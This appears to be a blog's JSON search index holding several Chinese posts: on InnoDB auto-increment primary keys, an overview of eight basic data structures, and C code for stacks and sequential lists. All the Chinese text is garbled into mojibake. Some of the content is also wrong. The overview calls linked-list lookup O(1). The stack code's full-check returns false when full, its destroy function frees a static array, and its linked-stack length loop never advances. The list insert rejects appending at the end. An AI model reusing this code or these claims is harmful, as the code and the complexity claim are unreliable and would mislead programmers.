åŸºäºä»¥ä¸Šç´¢å¼•ç»´æŠ¤è¿‡ç¨‹è¯´æ˜ï¼Œå¦‚æœæ¯æ¬¡æ’å…¥ä¸€æ¡æ–°è®°å½•ï¼Œéƒ½æ˜¯è¿½åŠ æ“ä½œï¼Œéƒ½ä¸æ¶‰åŠåˆ°æŒªåŠ¨å…¶ä»–è®°å½•ï¼Œä¹Ÿä¸ä¼šè§¦å‘å¶å­èŠ‚ç‚¹çš„åˆ†è£‚ï¼Œè¿™æ ·å°±èƒ½æœ€å¤§ç¨‹åº¦çš„ç»´æŠ¤å¥½ç´¢å¼•çš„æœ‰åºæ€§ã€‚ è€Œè¿™ç§â€œè‡ªåŠ¨è¿½åŠ æ“ä½œâ€ï¼Œå°±æ˜¯è‡ªå¢ä¸»é”®çš„æ’å…¥æ•°æ®æ¨¡å¼ã€‚ è€Œæœ‰ä¸šåŠ¡é€»è¾‘çš„å­—æ®µåšä¸»é”®ï¼Œåˆ™å¾€å¾€ä¸å®¹æ˜“ä¿è¯æœ‰åºæ’å…¥ï¼Œè¿™æ ·å†™æ•°æ®æˆæœ¬ç›¸å¯¹è¾ƒé«˜ã€‚ é™¤äº†è€ƒè™‘æ€§èƒ½å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä»å­˜å‚¨ç©ºé—´çš„è§’åº¦æ¥çœ‹ã€‚å‡è®¾ä½ çš„è¡¨ä¸­ç¡®å®æœ‰ä¸€ä¸ªå”¯ä¸€å­—æ®µï¼Œæ¯”å¦‚å­—ç¬¦ä¸²ç±»å‹çš„èº«ä»½è¯å·ï¼Œé‚£åº”è¯¥ç”¨èº«ä»½è¯å·åšä¸»é”®ï¼Œè¿˜æ˜¯ç”¨è‡ªå¢å­—æ®µåšä¸»é”®å‘¢? ç”±äºæ¯ä¸ªéä¸»é”®ç´¢å¼•çš„å¶å­èŠ‚ç‚¹ä¸Šéƒ½æ˜¯ä¸»é”®çš„å€¼ã€‚å¦‚æœç”¨èº«ä»½è¯å·åšä¸»é”®ï¼Œé‚£ä¹ˆæ¯ä¸ªäºŒçº§ç´¢ å¼•çš„å¶å­èŠ‚ç‚¹å ç”¨çº¦ 20 ä¸ªå­—èŠ‚ï¼Œè€Œå¦‚æœç”¨æ•´å‹åšä¸»é”®ï¼Œåˆ™åªè¦ 4 ä¸ªå­—èŠ‚ï¼Œå¦‚æœæ˜¯é•¿æ•´å‹ (bigint)åˆ™æ˜¯ 8 ä¸ªå­—èŠ‚ã€‚ æ˜¾ç„¶ï¼Œä¸»é”®é•¿åº¦è¶Šå°ï¼Œæ™®é€šç´¢å¼•çš„å¶å­èŠ‚ç‚¹å°±è¶Šå°ï¼Œæ™®é€šç´¢å¼•å ç”¨çš„ç©ºé—´ä¹Ÿå°±è¶Šå°ã€‚ æ‰€ä»¥ï¼Œä»æ€§èƒ½å’Œå­˜å‚¨ç©ºé—´æ–¹é¢è€ƒé‡ï¼Œè‡ªå¢ä¸»é”®å¾€å¾€æ˜¯æ›´åˆç†çš„é€‰æ‹©ã€‚ æœ‰æ²¡æœ‰ä»€ä¹ˆåœºæ™¯é€‚åˆç”¨ä¸šåŠ¡å­—æ®µç›´æ¥åšä¸»é”®çš„å‘¢ï¼Ÿè¿˜æ˜¯æœ‰çš„ã€‚æ¯”å¦‚ï¼Œæœ‰äº›ä¸šåŠ¡çš„åœºæ™¯éœ€æ±‚æ˜¯è¿™æ ·çš„: åªæœ‰ä¸€ä¸ªç´¢å¼•; è¯¥ç´¢å¼•å¿…é¡»æ˜¯å”¯ä¸€ç´¢å¼•ã€‚ è¿™å°±æ˜¯å…¸å‹çš„ KV åœºæ™¯ã€‚ç”±äºæ²¡æœ‰å…¶ä»–ç´¢å¼•ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸ç”¨è€ƒè™‘å…¶ä»–ç´¢å¼•çš„å¶å­èŠ‚ç‚¹å¤§å°çš„é—®é¢˜ã€‚ æ€»ç»“ InnoDB é‡‡ç”¨ B+ æ ‘ç»“æ„ä½œä¸ºç´¢å¼•æ¨¡å‹ï¼Œæ˜¯å› ä¸ºB+ æ ‘èƒ½å¤Ÿå¾ˆå¥½åœ°é…åˆç£ç›˜çš„è¯»å†™ç‰¹æ€§ï¼Œå‡å°‘å•æ¬¡æŸ¥è¯¢çš„ç£ç›˜è®¿é—®æ¬¡æ•°ã€‚ ç”±äº InnoDB æ˜¯ç´¢å¼•ç»„ç»‡è¡¨ï¼Œé€šå¸¸ä¼šå»ºè®®åˆ›å»ºä¸€ä¸ªè‡ªå¢ä¸»é”®ï¼Œè¿™æ ·éä¸»é”®ç´¢å¼• å ç”¨çš„ç©ºé—´æœ€å°ã€‚ å°½é‡ä½¿ç”¨ä¸»é”®æŸ¥è¯¢ï¼Œå…¶ç›®çš„æ˜¯å‡å°‘å›è¡¨ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"å…«å¤§åŸºæœ¬æ•°æ®ç»“æ„æ¦‚è¿°","slug":"mathematical-structural-overview","date":"2022-05-28T13:32:43.000Z","updated":"2023-02-18T03:28:33.604Z","comments":true,"path":"mathematical-structural-overview/","link":"","permalink":"https://www.0x2beace.com/mathematical-structural-overview/","excerpt":"æ•°æ®ç»“æ„æ˜¯ä¸€ç§å…·æœ‰ä¸€å®šé€»è¾‘å…³ç³»ï¼Œåœ¨è®¡ç®—æœºä¸­åº”ç”¨æŸç§å­˜å‚¨ç»“æ„ï¼Œå¹¶ä¸”å°è£…äº†ç›¸åº”æ“ä½œçš„æ•°æ®å…ƒç´ é›†åˆï¼Œå¸¸ç”¨çš„æ•°æ®ç»“æ„æœ‰ä»¥ä¸‹8ç§ï¼š","text":"æ•°æ®ç»“æ„æ˜¯ä¸€ç§å…·æœ‰ä¸€å®šé€»è¾‘å…³ç³»ï¼Œåœ¨è®¡ç®—æœºä¸­åº”ç”¨æŸç§å­˜å‚¨ç»“æ„ï¼Œå¹¶ä¸”å°è£…äº†ç›¸åº”æ“ä½œçš„æ•°æ®å…ƒç´ é›†åˆï¼Œå¸¸ç”¨çš„æ•°æ®ç»“æ„æœ‰ä»¥ä¸‹8ç§ï¼š é“¾è¡¨é“¾è¡¨æ˜¯ä¸€ç§éå¸¸å¸¸è§çš„æ•°æ®ç»“æ„ï¼Œæœ‰å¤šç§æ‰©å±•çš„é“¾è¡¨ï¼š å•å‘é“¾è¡¨ åŒå‘é“¾è¡¨ å¾ªç¯é“¾è¡¨ é“¾è¡¨çš„ç‰¹ç‚¹æ˜¯ï¼š æ·»åŠ åˆ é™¤æ•°æ®å¾ˆæ–¹ä¾¿ï¼Œå› ä¸ºåªéœ€è¦ç§»åŠ¨æŒ‡é’ˆçš„æŒ‡å‘ï¼Œç„¶åæ“ä½œç›®æ ‡å…ƒç´ å³å¯ï¼Œå¤æ‚åº¦ä¸ºO(1) æŸ¥æ‰¾æ•°æ®ï¼Œé€Ÿåº¦å¾ˆæ…¢ï¼Œå¤æ‚åº¦ä¸º O(1) é“¾è¡¨çš„æ•°æ®å­˜å‚¨æ˜¯åˆ†æ•£çš„ï¼Œæ— éœ€å­˜å‚¨åœ¨è¿ç»­çš„å†…å­˜ç©ºé—´ä¸­ é€‚ç”¨åœºæ™¯ï¼šæ•°æ®é‡è¾ƒå°ï¼Œéœ€è¦é¢‘ç¹å¢åŠ ï¼Œåˆ é™¤æ“ä½œçš„åœºæ™¯ æ•°ç»„æ•°ç»„ä¹Ÿæ˜¯çº¿æ€§æ’åˆ—çš„ä¸€ç§æ•°æ®ç»“æ„ã€‚ æ•°ç»„çš„ç‰¹ç‚¹æ˜¯ï¼š æŸ¥æ‰¾æ•°æ®ï¼Œé€Ÿåº¦å¾ˆå¿«ï¼Œå¤æ‚åº¦ä¸º O(1) æ·»åŠ åˆ é™¤æ•°æ®å¾ˆæ…¢ï¼Œå› ä¸ºéœ€è¦ç§»åŠ¨å…ƒç´ ï¼Œå¤æ‚åº¦ä¸º O(n) æ•°ç»„æ˜¯å­˜å‚¨åœ¨ä¸€ç‰‡è¿ç»­çš„å†…å­˜ç©ºé—´ä¸­ï¼Œæ¯ä¸ªæ•°æ®çš„å†…å­˜åœ°å€éƒ½å¯ä»¥é€šè¿‡æ•°ç»„ä¸‹æ ‡è®¡ç®—å‡ºæ¥ é€‚ç”¨åœºæ™¯ï¼šé¢‘ç¹æŸ¥è¯¢ï¼Œå¯¹å­˜å‚¨ç©ºé—´è¦æ±‚ä¸å¤§ï¼Œè¾ƒå°‘å¢åŠ å’Œåˆ é™¤çš„åœºæ™¯ æ ˆæ ˆä¹Ÿæ˜¯ä¸€ç§æ•°æ®å‘ˆçº¿æ€§æ’åˆ—çš„æ•°æ®ç»“æ„ã€‚ æ ˆçš„ç‰¹ç‚¹æ˜¯ï¼š å…ƒç´ åªèƒ½é€šè¿‡ä¸€ç«¯è¿›è¡Œè®¿é—® å…ˆè¿›åå‡ºï¼ˆæœ€å…ˆè¿›å…¥çš„å…ƒç´ ï¼Œåªèƒ½æœ€åå–å‡ºï¼‰ é˜Ÿåˆ—é˜Ÿåˆ—æ˜¯ç±»ä¼¼æ ˆçš„æ•°æ®ç»“æ„ã€‚ é˜Ÿåˆ—çš„ç‰¹ç‚¹æ˜¯ï¼š å…ƒç´ å¯ä»¥é€šè¿‡ä¸¤ç«¯è¿›è¡Œè®¿é—® å…ˆè¿›å…ˆå‡ºï¼ˆæœ€å…ˆè¿›å…¥çš„å…ƒç´ ï¼Œæœ€å…ˆå–å‡º å“ˆå¸Œè¡¨å“ˆå¸Œè¡¨æ˜¯æ ¹æ®é”®å€¼å¯¹ç›´æ¥è¿›è¡Œè®¿é—®çš„æ•°æ®ç»“æ„ã€‚ å“ˆå¸Œè¡¨çš„ç‰¹ç‚¹æ˜¯ï¼š æŸ¥æ‰¾æ•°æ®ï¼Œé€Ÿåº¦å¾ˆå¿« æ— æ³•åšèŒƒå›´æŸ¥æ‰¾ å †å †æ˜¯ä¸€ç§å›¾çš„æ ‘å½¢ç»“æ„ã€‚ å †çš„ç‰¹ç‚¹æ˜¯ï¼š æ¯ä¸ªç»“ç‚¹æœ€å¤šæœ‰ä¸¤ä¸ªå­ç»“ç‚¹ å­ç»“ç‚¹å¿…é¡»å¤§äºçˆ¶ç»“ç‚¹ å †ä¸­æœ€é¡¶ç«¯çš„æ•°æ®å§‹ç»ˆæœ€å°ï¼Œæ— è®ºæ•°æ®é‡æœ‰å¤šå°‘ï¼Œå–å‡ºæœ€å°å€¼çš„æ—¶é—´å¤æ‚åº¦éƒ½ä¸ºO(1) å–å‡ºæ•°æ®ï¼Œéœ€è¦å°†æœ€åçš„æ•°æ®ç§»åŠ¨åˆ°æœ€é¡¶ç«¯ï¼Œä¸€è¾¹ä¸å­ç»“ç‚¹æ¯”è¾ƒå¤§å°ï¼Œä¸€è¾¹å¾€ä¸‹ç§»åŠ¨ï¼Œå¤æ‚åº¦ä¸ºO(logn) æ·»åŠ æ•°æ®ï¼Œä¸€è¾¹ä¸çˆ¶ç»“ç‚¹æ¯”è¾ƒå¤§å°ï¼Œä¸€è¾¹å¾€ä¸Šç§»åŠ¨ï¼Œå¤æ‚åº¦ä¸ºO(logn) æ ‘äºŒå‰æŸ¥æ‰¾æ ‘ï¼ˆåˆå«äºŒå‰æœç´¢æ ‘æˆ–äºŒå‰æ’åºæ ‘ï¼‰æ˜¯ä¸€ç§å›¾å½¢çš„æ•°æ®ç»“æ„ã€‚ äºŒå‰æŸ¥æ‰¾æ ‘çš„ç‰¹ç‚¹æ˜¯ï¼š æ¯ä¸ªç»“ç‚¹æœ€å¤šæœ‰ä¸¤ä¸ªå­ç»“ç‚¹ æ¯ä¸ªç»“ç‚¹çš„å€¼å‡å¤§äºå·¦å­æ ‘ä¸Šä»»æ„ä¸€ä¸ªç»“ç‚¹çš„å€¼ æ¯ä¸ªç»“ç‚¹çš„å€¼å‡å°äºå³å­æ ‘ä¸Šä»»æ„ä¸€ä¸ªç»“ç‚¹çš„å€¼ å›¾å›¾æ˜¯ç”±ç»“ç‚¹çš„æœ‰ç©·é›†åˆVå’Œè¾¹çš„é›†åˆEç»„æˆï¼Œå›¾çš„æ•°æ®ç»“æ„æ¯”è¾ƒå¤æ‚ï¼Œåœ¨å­˜å‚¨æ•°æ®ä¸Šæœ‰ç€æ¯”è¾ƒå¤æ‚å’Œé«˜æ•ˆçš„ç®—æ³•ï¼Œåˆ†åˆ«æœ‰é‚»æ¥çŸ©é˜µ ã€é‚»æ¥è¡¨ã€åå­—é“¾è¡¨ã€é‚»æ¥å¤šé‡è¡¨ã€è¾¹é›†æ•°ç»„ç­‰å­˜å‚¨ç»“æ„ã€‚","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"æ•°æ®ç»“æ„ï¼ˆä¸‰ï¼‰æ ˆ","slug":"data-structure-3-stack","date":"2022-05-26T16:02:07.000Z","updated":"2022-06-17T07:35:22.675Z","comments":true,"path":"data-structure-3-stack/","link":"","permalink":"https://www.0x2beace.com/data-structure-3-stack/","excerpt":"æ ˆçš„å®šä¹‰æ ˆæ˜¯ä¸€ç§åªèƒ½ä»è¡¨çš„ä¸€ç«¯å­˜å–æ•°æ®ä¸”éµå¾ª â€œåè¿›å…ˆå‡º LIFOï¼ˆLast In First Outï¼‰â€ åŸåˆ™çš„çº¿æ€§å­˜å‚¨ç»“æ„ã€‚","text":"æ ˆçš„å®šä¹‰æ ˆæ˜¯ä¸€ç§åªèƒ½ä»è¡¨çš„ä¸€ç«¯å­˜å–æ•°æ®ä¸”éµå¾ª â€œåè¿›å…ˆå‡º LIFOï¼ˆLast In First Outï¼‰â€ åŸåˆ™çš„çº¿æ€§å­˜å‚¨ç»“æ„ã€‚ é€šå¸¸ï¼Œæ ˆçš„å¼€å£ç«¯è¢«ç§°ä¸ºæ ˆé¡¶ï¼Œå…è®¸è¿›è¡Œæ’å…¥å’Œåˆ é™¤ï¼›ç›¸åº”åœ°ï¼Œå°å£ç«¯è¢«ç§°ä¸ºæ ˆåº•ï¼Œä¸å…è®¸è¿›è¡Œæ’å…¥å’Œåˆ é™¤ã€‚ åŸºäºæ ˆç»“æ„çš„ç‰¹ç‚¹ï¼Œåœ¨å®é™…åº”ç”¨ä¸­ï¼Œé€šå¸¸åªä¼šå¯¹æ ˆæ‰§è¡Œä»¥ä¸‹ä¸¤ç§æ“ä½œï¼š å‘æ ˆä¸­æ·»åŠ å…ƒç´ ï¼Œæ­¤è¿‡ç¨‹è¢«ç§°ä¸ºâ€è¿›æ ˆâ€ï¼ˆå…¥æ ˆæˆ–å‹æ ˆï¼‰ï¼› ä»æ ˆä¸­æå–å‡ºæŒ‡å®šå…ƒç´ ï¼Œæ­¤è¿‡ç¨‹è¢«ç§°ä¸ºâ€å‡ºæ ˆâ€ï¼ˆæˆ–å¼¹æ ˆï¼‰ï¼› æ ˆçš„åŸºæœ¬æ“ä½œï¼š void InitStack(SqStack &amp;S); // åˆå§‹åŒ–ä¸€ä¸ªç©ºæ ˆ bool StackEmpty(SqStack S); // åˆ¤æ–­ä¸€ä¸ªæ ˆæ˜¯å¦ä¸ºç©ºï¼Œ è‹¥æ‰¾ s ä¸ºç©ºåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚ bool Push(SqStack &amp;S, ElemType x); // è¿›æ ˆï¼Œè‹¥æ ˆ s æœªæ»¡ï¼Œåˆ™å°† x å‹å…¥æ ˆ bool Pop(SqStack &amp;s, ElemType &amp;x); // å‡ºæ ˆï¼Œè‹¥æ ˆ S éç©ºï¼Œåˆ™å¼¹å‡ºæ ˆé¡¶å…ƒç´ ï¼Œ å¹¶ç”¨ x è¿”å›ã€‚ bool GetTop(SqStack S, ElemType &amp;x);// è¯»æ ˆé¡¶å…ƒç´ ï¼Œè‹¥æ ˆ s éç©ºï¼Œåˆ™ç”¨ x è¿”å›æ ˆé¡¶å…ƒç´ ã€‚ void DestroyStack(SqStack&amp;S); // é”€æ¯æ ˆï¼Œå¹¶é‡Šæ”¾æ ˆ s å ç”¨çš„å­˜å‚¨ç©ºé—´ã€‚ bool StackOverflow(SqStack S); // åˆ¤æ–­æ ˆæ˜¯å¦æ»¡ int StackLength(SqStack S); // æ ˆå…ƒç´ ä¸ªæ•° æ ˆçš„é¡ºåºå­˜å‚¨é‡‡ç”¨é¡ºåºå­˜å‚¨ç»“æ„å¯ä»¥æ¨¡æ‹Ÿæ ˆå­˜å‚¨æ•°æ®çš„ç‰¹ç‚¹ï¼Œä»è€Œå®ç°æ ˆå­˜å‚¨ç»“æ„ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117#define MaxSize 100 // å®šä¹‰æ ˆä¸­å…ƒç´ çš„æœ€å¤§ä¸ªæ•°/** * æ ˆçš„é¡ºåºå­˜å‚¨ */typedef int ElemType; // å…ƒç´ æ•°æ®ç±»å‹typedef struct SqStack &#123; ElemType data[MaxSize]; // å­˜æ”¾æ ˆä¸­å…ƒç´  int top; // æ ˆé¡¶æŒ‡é’ˆ&#125; SqStack;/** * åˆå§‹åŒ–æ ˆ * * @param S */void InitStack(SqStack &amp;S)&#123; // å°†æ ˆé¡¶èµ‹å€¼ä¸º -1 S.top = -1;&#125;;/** * åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º * * @param S * @return */bool StackEmpty(SqStack S)&#123; return S.top == -1;&#125;;/** * å…¥æ ˆ * * @param S * @param x * @return */bool Push(SqStack &amp;S, ElemType x)&#123; if (StackOverflow(S)) &#123; return false; &#125; // å…ˆç»™S.top +1ï¼Œç„¶åç»™ S.data[S.top +1] èµ‹å€¼ S.data[++S.top] = x; return true;&#125;;/** * å‡ºæ ˆ * * @param S * @param x * @return */bool Pop(SqStack &amp;S, ElemType &amp;x)&#123; // åˆ¤æ–­æ ˆç©º if (StackEmpty(S)) &#123; return false; &#125; // å…ˆæŠŠS.data[S.top] çš„å€¼èµ‹å€¼ç»™ xï¼Œç„¶å S.top -1 x = S.data[S.top--]; return true;&#125;;/** * è·å–æ ˆé¡¶å…ƒç´  * * @param S * @param x * @return */bool GetTop(SqStack S, ElemType &amp;x)&#123; // åˆ¤æ–­æ ˆç©º if (StackEmpty(S)) &#123; return false; &#125; x = S.data[S.top]; return true;&#125;;/** * é”€æ¯æ ˆ * * @param S */void DestroyStack(SqStack &amp;S)&#123; S.top = -1; // é‡Šæ”¾æ ˆ S æ‰€å å­˜å‚¨ç©ºé—´ free(S.data);&#125;;/** * åˆ¤æ–­æ¡Ÿæ»¡ * * @param S * @return */bool StackOverflow(SqStack S)&#123; if (S.top &gt;= MaxSize-1) &#123; return false; &#125;&#125;;/** * è·å–æ ˆçš„å…ƒç´ ä¸ªæ•° * * @param S * @return */int StackLength(SqStack S)&#123; return S.top+1;&#125;; æ ˆçš„é“¾å¼å­˜å‚¨é‡‡ç”¨é“¾å¼å­˜å‚¨ç»“æ„å®ç°æ ˆç»“æ„ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475/** * æ ˆçš„é“¾å¼å­˜å‚¨ */typedef struct LinkNode &#123; ElemType data; LinkNode * next;&#125;LinkNode, *LiStack;/** * åˆå§‹åŒ–æ ˆ * * @param LS * @return */LiStack InitLiStack(LiStack &amp;LS)&#123; LS = (LiStack) malloc(sizeof(LinkNode)); LS-&gt;next = NULL; return LS;&#125;;/** * åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º * * @param LS * @return */bool LiStackEmpty(LiStack LS)&#123; return LS-&gt;next == NULL;&#125;;/** * å…¥æ ˆ * * @param LS * @param x */void LiPush(LiStack &amp;LS, ElemType x)&#123; LiStack Lhead = (LiStack) malloc(sizeof(LinkNode)); Lhead-&gt;data = x; Lhead-&gt;next = LS-&gt;next; LS-&gt;next = Lhead;&#125;;/** * å‡ºæ ˆ * * @param LS * @return */ElemType LiPop(LiStack &amp;LS)&#123; if (LiStackEmpty(LS)) &#123; return false; &#125; ElemType x; LiStack Lhead = LS-&gt;next; LS-&gt;next = Lhead-&gt;next; x = Lhead-&gt;data; free(Lhead); return x;&#125;;/** * è·å–æ ˆçš„å…ƒç´ ä¸ªæ•° * * @param LS * @return */int LiStackLength(LiStack LS)&#123; int i = 0; while (LS-&gt;next != NULL) &#123; i ++; &#125; return i;&#125;;","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"æ•°æ®ç»“æ„ï¼ˆäºŒï¼‰çº¿æ€§è¡¨","slug":"data-structure-2-linear-table","date":"2022-05-25T15:49:45.000Z","updated":"2022-06-17T07:35:22.675Z","comments":true,"path":"data-structure-2-linear-table/","link":"","permalink":"https://www.0x2beace.com/data-structure-2-linear-table/","excerpt":"çº¿æ€§è¡¨çš„é€»è¾‘ç»“æ„å®šä¹‰ï¼šç”± Nï¼ˆN &gt;= 0ï¼‰ä¸ªç›¸åŒç±»å‹çš„å…ƒç´ ç»„æˆçš„æœ‰åºé›†åˆã€‚","text":"çº¿æ€§è¡¨çš„é€»è¾‘ç»“æ„å®šä¹‰ï¼šç”± Nï¼ˆN &gt;= 0ï¼‰ä¸ªç›¸åŒç±»å‹çš„å…ƒç´ ç»„æˆçš„æœ‰åºé›†åˆã€‚ 1L &#x3D; (a1, a2, , ai-1, ai, ai+1, , an); æ•°ç»„æ˜¯ä¸€ç§çº¿æ€§è¡¨ï¼Œä½†æ˜¯ä¸èƒ½è¯´çº¿æ€§è¡¨å°±æ˜¯æ•°ç»„ã€‚çº¿æ€§è¡¨å¯ä»¥ç”¨æ•°ç»„å®ç°ï¼ˆé¡ºåºè¡¨ï¼‰ï¼Œä¹Ÿå¯ä»¥ç”¨é“¾è¡¨å®ç°ï¼ˆå•é“¾è¡¨ã€åŒé“¾è¡¨ï¼‰ã€‚ çº¿æ€§è¡¨ä¸­å…ƒç´ ä¸ªæ•° nï¼Œç§°ä¸ºçº¿æ€§è¡¨çš„é•¿åº¦ã€‚å½“ n=0 æ—¶ï¼Œä¸ºç©ºè¡¨ã€‚ a1 æ˜¯å”¯ä¸€ä¸€ä¸ª ç¬¬ä¸€ä¸ª æ•°æ®å…ƒç´ ï¼Œan æ˜¯å”¯ä¸€çš„ æœ€åä¸€ä¸ª æ•°æ®å…ƒç´ ã€‚ ai-1 æ˜¯ ai çš„ç›´æ¥å‰é©±ï¼Œai+1 ä¸º ai çš„ç›´æ¥åç»§ã€‚ çº¿æ€§è¡¨çš„ç‰¹ç‚¹ï¼š è¡¨ä¸­å…ƒç´ æ˜¯æœ‰é™çš„ è¡¨ä¸­å…ƒç´ çš„æ•°æ®ç±»å‹éƒ½æ˜¯ç›¸åŒçš„ï¼Œæ„å‘³ç€æ¯ä¸€ä¸ªå…ƒç´ å ç”¨ç›¸åŒå¤§å°çš„ç©ºé—´ è¡¨ä¸­å…ƒç´ å…·æœ‰é€»è¾‘ä¸Šçš„é¡ºåºæ€§ï¼Œåœ¨åºåˆ—ä¸­å„å…ƒç´ æ’åºæœ‰å…¶å…ˆåé¡ºåº çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ä½¿ç”¨é¡ºåºå‚¨å­˜å®ç°çº¿æ€§è¡¨çš„ä¼˜ç‚¹ï¼š å¯ä»¥éšæœºå­˜å–ï¼ˆæ ¹æ®è¡¨å¤´ä»»æ„å…ƒç´ åœ°å€å’Œå…ƒç´ åºå·ï¼‰è¡¨ä¸­ä»»æ„ä¸€ä¸ªå…ƒç´  å­˜å‚¨å¯†åº¦é«˜ï¼Œæ¯ä¸ªç»“ç‚¹åªå­˜å‚¨æ•°æ®å…ƒç´  ç¼ºç‚¹ï¼š æ’å…¥å’Œåˆ é™¤æ—¶éƒ½éœ€è¦ç§»åŠ¨å¤§é‡å…ƒç´  çº¿æ€§è¡¨å˜åŒ–è¾ƒå¤§æ—¶ï¼Œéš¾ä»¥ç¡®å®šå­˜å‚¨ç©ºé—´çš„å®¹é‡ å­˜å‚¨åˆ†é…éœ€è¦ä¸€æ®µè¿ç»­çš„å­˜å‚¨ç©ºé—´ï¼Œä¸å¤Ÿçµæ´» çº¿æ€§è¡¨åŸºæœ¬æ“ä½œä¸»è¦æœ‰ï¼š bool InitList(SqList &amp;L)ï¼šåˆå§‹åŒ–è¡¨ã€‚æ„é€ ä¸€ä¸ªç©ºçš„çº¿æ€§è¡¨ã€‚ int LocateElem(SqList L, ElemType e)ï¼šæŒ‰å€¼æŸ¥æ‰¾æ“ä½œã€‚åœ¨è¡¨ L ä¸­æŸ¥æ‰¾å…·æœ‰ç»™å®šå…³é”®å®‡å€¼çš„å…ƒç´ ã€‚ ElemType GetElem(SqList L, int i)ï¼šæŒ‰ä½æŸ¥æ‰¾æ“ä½œã€‚è·å–è¡¨ L ä¸­ç¬¬ i ä¸ªä½ç½®çš„å…ƒç´ çš„å€¼ã€‚ bool ListInsert(SqList &amp;L, int i, ElemType e)ï¼šæ’å…¥æ“ä½œã€‚åœ¨è¡¨ L ä¸­çš„ç¬¬ i ä¸ªä½ç½®ä¸Šæ’å…¥æŒ‡å®šå…ƒç´  eã€‚ bool ListDelete(SqList &amp;L, int i, ElemType &amp;e)ï¼šåˆ é™¤æ“ä½œã€‚åˆ é™¤è¡¨ L ä¸­ç¬¬ i ä¸ªä½ç½®çš„å…ƒç´ ï¼Œå¹¶ç”¨ e è¿”å›åˆ é™¤å…ƒç´ çš„å€¼ã€‚ int Length(SqList L)ï¼šè¿”å›çº¿æ€§è¡¨ L çš„é•¿åº¦ï¼Œå³ L ä¸­æ•°æ®å…ƒç´ çš„ä¸ªæ•°ã€‚ bool Empty(SqList L)ï¼šåˆ¤ç©ºæ“ä½œã€‚è‹¥ L ä¸ºç©ºè¡¨ï¼Œ åˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚ bool DestroyList(SqList &amp;L)ï¼šé”€æ¯æ“ä½œã€‚é”€æ¯çº¿æ€§è¡¨ï¼Œäº•é‡Šæ”¾çº¿æ€§è¡¨ L æ‰€å ç”¨çš„å†…å­˜ç©ºé—´ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154#include \"SqList.hpp\"/** * åˆå§‹åŒ–ã€‚æ„é€ ä¸€ä¸ªç©ºçš„çº¿æ€§è¡¨ã€‚ * * @param L * @return */bool InitList(SqList &amp;L)&#123; L.data = (ElemType *) malloc(sizeof (ElemType) * MaxSize); L.length = 0; return true;&#125;;/** * æ’å…¥æ“ä½œï¼Œåœ¨è¡¨ L ï¼Œç¬¬ i ä¸ªä½ç½®æ’å…¥æŒ‡å®šå…ƒç´  e * * @param L * @param i * @param e * @return */bool ListInsert(SqList &amp;L, int i, ElemType e)&#123; // åˆ¤æ–­ i çš„å–å€¼èŒƒå›´æ˜¯å¦æœ‰æ•ˆï¼ˆ 1&lt;=i&lt;=L.length) if (i &lt; 1 || i &gt; L.length) &#123; return false; &#125; // å½“å­˜å‚¨ç©ºé—´å·²æ»¡ï¼Œä¸èƒ½æ’å…¥ if (i &gt;= MaxSize) &#123; return false; &#125; for (int j = L.length; j &gt;= i; j--) &#123; L.data[j] = L.data[j-1]; &#125; L.data[i-1] = e; L.length ++; return true;&#125;/** * åˆ é™¤æ“ä½œï¼Œåˆ é™¤çº¿æ€§è¡¨ L ç¬¬ i ä¸ªä½ç½®çš„å…ƒç´ ï¼Œå¹¶ç”¨ e è¿”å›è¢«åˆ é™¤å…ƒç´ çš„ * * @param L * @param i * @param e * @return */bool ListDelete(SqList &amp;L, int i, ElemType &amp;e) &#123; // i çš„å€¼å¿…é¡»åˆæ³• if (Empty(L)) &#123; return false; &#125; // åˆ¤æ–­ i çš„å–å€¼èŒƒå›´æ˜¯å¦æœ‰æ•ˆï¼ˆ 1&lt;=i&lt;=L.length) if (i &lt; 1 || i &gt; L.length) &#123; return false; &#125; // éœ€è¦è¢«åˆ é™¤å…ƒç´ çš„å€¼ e = L.data[i-1]; // å°†å‰©ä½™çš„å…ƒç´ çš„å€¼å¾€å‰ç§»åŠ¨ for (int j = i; j &lt; L.length; j++) &#123; L.data[j-1] = L.data[j]; &#125; L.length--; return true;&#125;/** * è¿”å›çº¿æ€§è¡¨çš„é•¿åº¦ * * @param L * @return */int Length(SqList L) &#123; return L.length;&#125;;/** * æŒ‰å€¼æŸ¥æ‰¾ * * @param L * @param e * @return */int LocateElem(SqList L, ElemType e) &#123; for (int i = 0; i &lt; L.length; ++i) &#123; if (L.data[i] == e) &#123; // ä¸‹æ ‡ä¸º i çš„å…ƒç´ ç­‰äº eï¼Œè¿”å›å…¶ä½åºä¸º i+1 return i+1; &#125; &#125; return 0;&#125;;/** * æŒ‰ä½æŸ¥æ‰¾ 